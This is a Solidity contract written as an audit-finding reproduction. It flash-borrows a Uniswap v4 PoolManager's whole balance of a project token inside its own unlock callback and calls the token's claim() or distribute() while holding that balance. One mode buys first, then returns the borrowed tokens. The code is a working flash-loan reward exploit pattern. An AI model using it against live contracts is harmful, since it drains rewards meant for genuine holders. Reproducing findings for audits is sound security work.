// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {PadToken} from "../src/PadToken.sol";

interface IERC20Like {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// @notice Audit finding reproduction: inside its own PoolManager unlock, borrow the pool's whole token balance
///         (v4 flash accounting), trigger a reward distribution while "holding" it, then return the tokens.
contract FlashHolder is IUnlockCallback {
    IPoolManager immutable pm;
    PadToken immutable t;
    uint8 mode; // 0: claim() while borrowed, 1: distribute() while borrowed, 2: buy then claim while borrowed
    PoolKey key;
    bool quoteIs0;
    uint256 buyAmount;

    constructor(IPoolManager pm_, PadToken t_) {
        pm = pm_;
        t = t_;
    }

    function run(uint8 mode_) external {
        mode = mode_;
        pm.unlock("");
    }

    function runBuy(PoolKey calldata key_, bool quoteIs0_, uint256 amount) external {
        mode = 2;
        key = key_;
        quoteIs0 = quoteIs0_;
        buyAmount = amount;
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        uint256 bought;
        if (mode == 2) {
            // buy with IMD inside our own unlock (the hook charges its 4% as usual)
            BalanceDelta d = pm.swap(
                key,
                SwapParams(quoteIs0, -int256(buyAmount), quoteIs0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1),
                ""
            );
            bought = uint256(int256(quoteIs0 ? d.amount1() : d.amount0()));
            Currency q = quoteIs0 ? key.currency0 : key.currency1;
            pm.sync(q);
            IERC20Like(Currency.unwrap(q)).transfer(address(pm), buyAmount);
            pm.settle();
        }
        // flash-borrow everything the PoolManager holds of this token (our purchase is still owed to us)
        uint256 borrowed = t.balanceOf(address(pm));
        pm.take(Currency.wrap(address(t)), address(this), borrowed);
        if (mode == 1) t.distribute();
        else t.claim();
        // return what we borrowed; keep only what we actually bought
        pm.sync(Currency.wrap(address(t)));
        t.transfer(address(pm), borrowed - bought);
        pm.settle();
        return "";
    }

    receive() external payable {}
}
